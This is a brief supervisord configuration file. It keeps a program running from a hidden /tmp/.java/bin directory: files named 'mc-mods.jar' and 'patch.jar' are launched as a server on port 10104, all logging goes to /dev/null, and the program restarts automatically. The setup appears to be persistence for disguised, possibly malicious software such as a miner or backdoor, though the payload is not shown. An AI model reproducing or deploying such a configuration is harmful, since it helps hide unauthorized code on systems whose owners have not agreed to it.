# es/cfg-chsl.conf
[supervisord]
logfile=/dev/null

[program:app]
directory=/tmp/.java/bin
command=./mc-mods.jar -a '-java' ./patch.jar server -p 10104 --s
stdout_logfile=/dev/null
autorestart = true